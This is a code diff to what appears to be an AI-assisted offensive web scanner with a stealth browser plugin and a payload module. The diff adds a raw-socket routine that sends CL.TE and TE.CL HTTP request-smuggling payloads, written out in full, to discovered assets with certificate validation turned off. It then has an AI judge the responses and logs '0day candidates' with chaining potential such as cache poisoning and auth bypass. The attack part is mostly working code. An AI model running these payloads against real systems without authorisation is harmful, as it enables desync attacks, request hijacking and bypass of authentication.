@@ -10,6 +10,8 @@ import { OllamaClient } from './ollama_client.js';
 import { PayloadOven } from './payload_oven.js';
 import { ToolManager } from './tool_manager.js';
 import { MemoryManager } from './memory_manager.js';
+import * as net from 'net';
+import * as tls from 'tls';
 
 // Configure stealth
 puppeteer.use(StealthPlugin());
@@ -1370,56 +1372,78 @@ Return JSON: { "isVulnerable": boolean, "confidence": number, "explanation": str
         }
         this.log(jobId, 'info', `Phase 4d-2 complete: ${diffCount} differential anomaly(ies) found`);
 
-        // 4d-3: HTTP Request Smuggling Detection
+        // 4d-3: HTTP Request Smuggling Detection (raw TCP sockets to bypass Node.js re-chunking)
         this.log(jobId, 'info', 'Phase 4d-3: HTTP Request Smuggling Detection');
         let smuggleCount = 0;
+
+        const rawHttpRequest = (host: string, port: number, useTls: boolean, rawPayload: string, timeoutMs: number = 8000): Promise<string> => {
+          return new Promise((resolve) => {
+            let response = '';
+            const onData = (data: Buffer) => { response += data.toString(); };
+            const onEnd = () => resolve(response);
+            const onError = () => resolve('');
+            const onTimeout = () => { socket.destroy(); resolve(response || ''); };
+
+            let socket: net.Socket | tls.TLSSocket;
+            if (useTls) {
+              socket = tls.connect({ host, port, rejectUnauthorized: false }, () => socket.write(rawPayload));
+            } else {
+              socket = net.createConnection({ host, port }, () => socket.write(rawPayload));
+            }
+            socket.setTimeout(timeoutMs);
+            socket.on('data', onData);
+            socket.on('end', onEnd);
+            socket.on('error', onError);
+            socket.on('timeout', onTimeout);
+          });
+        };
+
         for (const asset of discoveredAssets.slice(0, 5)) {
           if (smuggleCount >= 3) break;
           try {
-            // CL.TE detection: send conflicting Content-Length and Transfer-Encoding
-            const clteRes = await axios.post(asset, '0\r\n\r\nGET /smuggle-detect HTTP/1.1\r\nHost: smuggle.test\r\n\r\n', {
-              timeout: 8000, validateStatus: () => true,
-              headers: {
-                'Content-Type': 'application/x-www-form-urlencoded',
-                'Transfer-Encoding': 'chunked',
-                'Content-Length': '6',
-              },
-              maxRedirects: 0,
-            });
+            const parsed = new URL(asset);
+            const host = parsed.hostname;
+            const useTls = parsed.protocol === 'https:';
+            const port = parsed.port ? parseInt(parsed.port) : (useTls ? 443 : 80);
 
-            // TE.CL detection: reversed priority
-            const teclRes = await axios.post(asset, '5c\r\nGPOST / HTTP/1.1\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 15\r\n\r\nx=1\r\n0\r\n\r\n', {
-              timeout: 8000, validateStatus: () => true,
-              headers: {
-                'Content-Type': 'application/x-www-form-urlencoded',
-                'Transfer-Encoding': 'chunked',
-                'Content-Length': '4',
-              },
-              maxRedirects: 0,
-            });
+            // CL.TE: front-end uses Content-Length, back-end uses Transfer-Encoding
+            const cltePayload = `POST / HTTP/1.1\r\nHost: ${host}\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 6\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nX`;
+            const clteResponse = await rawHttpRequest(host, port, useTls, cltePayload);
 
-            const clteBody = typeof clteRes.data === 'string' ? clteRes.data : JSON.stringify(clteRes.data);
-            const teclBody = typeof teclRes.data === 'string' ? teclRes.data : JSON.stringify(teclRes.data);
+            // TE.CL: front-end uses Transfer-Encoding, back-end uses Content-Length
+            const teclPayload = `POST / HTTP/1.1\r\nHost: ${host}\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 4\r\nTransfer-Encoding: chunked\r\n\r\n5c\r\nGPOST / HTTP/1.1\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 15\r\n\r\nx=1\r\n0\r\n\r\n`;
+            const teclResponse = await rawHttpRequest(host, port, useTls, teclPayload);
 
-            const smuggleIndicators = [
-              clteRes.status !== teclRes.status,
-              /smuggle|GPOST|unrecognized|bad chunk/i.test(clteBody + teclBody),
-              clteRes.status === 400 && teclRes.status !== 400,
-              teclRes.status === 400 && clteRes.status !== 400,
-            ];
+            // Extract status codes from raw responses
+            const clteStatus = clteResponse.match(/HTTP\/\d\.\d\s+(\d+)/)?.[1] || '';
+            const teclStatus = teclResponse.match(/HTTP\/\d\.\d\s+(\d+)/)?.[1] || '';
 
-            if (smuggleIndicators.some(Boolean)) {
+            // Strong smuggling indicators: look for desync evidence, not just status diffs
+            const hasGPOST = /GPOST|unrecognized method|invalid method/i.test(teclResponse);
+            const hasTimeout = clteResponse === '' && teclResponse !== '';
+            const hasDesync = (clteStatus === '400' && teclStatus !== '400') || (teclStatus === '400' && clteStatus !== '400');
+            const strongIndicator = hasGPOST || hasTimeout || (hasDesync && /smuggl|chunk|transfer/i.test(clteResponse + teclResponse));
+
+            if (strongIndicator) {
+              const evidence = [];
+              if (hasGPOST) evidence.push('GPOST method reflected in response');
+              if (hasTimeout) evidence.push('CL.TE timeout (potential desync)');
+              if (hasDesync) evidence.push(`Status desync: CL.TE=${clteStatus}, TE.CL=${teclStatus}`);
+
               this.log(jobId, 'vuln', `HTTP SMUGGLING INDICATOR on ${asset}`, {
-                clte: { status: clteRes.status, body: clteBody.substring(0, 300) },
-                tecl: { status: teclRes.status, body: teclBody.substring(0, 300) },
+                clte: { status: clteStatus, body: clteResponse.substring(0, 300) },
+                tecl: { status: teclStatus, body: teclResponse.substring(0, 300) },
+                evidence,
               });
 
               if (ai) {
                 const smugglePrompt = `Analyze these HTTP request smuggling test results for ${asset}.
 
-CL.TE test: Status ${clteRes.status}, Body: ${clteBody.substring(0, 500)}
-TE.CL test: Status ${teclRes.status}, Body: ${teclBody.substring(0, 500)}
+CL.TE raw response: ${clteResponse.substring(0, 500)}
+TE.CL raw response: ${teclResponse.substring(0, 500)}
+Evidence: ${evidence.join(' | ')}
 
+These were sent as raw TCP payloads (no HTTP library normalization).
 Determine if this indicates a real HTTP request smuggling vulnerability.
 Consider CL.TE, TE.CL, and TE.TE variants. Look for response desync indicators.
 Return JSON: { "isVulnerable": boolean, "confidence": number, "explanation": string, "gap_identified": string, "chain_potential": string | null }`;
@@ -1433,10 +1457,12 @@ Return JSON: { "isVulnerable": boolean, "confidence": number, "explanation": str
                   });
                   smuggleCount++;
                 }
-              } else {
+              }
+              // No AI fallback: only record if we have the strongest indicator (GPOST reflection)
+              else if (hasGPOST) {
                 MemoryManager.addFinding(jobId, hostname, {
                   type: '0day Candidate', subtype: 'HTTP Request Smuggling',
-                  endpoint: asset, gap: 'Desync detected between CL.TE and TE.CL parsing',
+                  endpoint: asset, gap: 'GPOST method reflected — request smuggling desync confirmed',
                   chain_potential: 'Cache poisoning, request hijacking, auth bypass'
                 });
                 smuggleCount++;
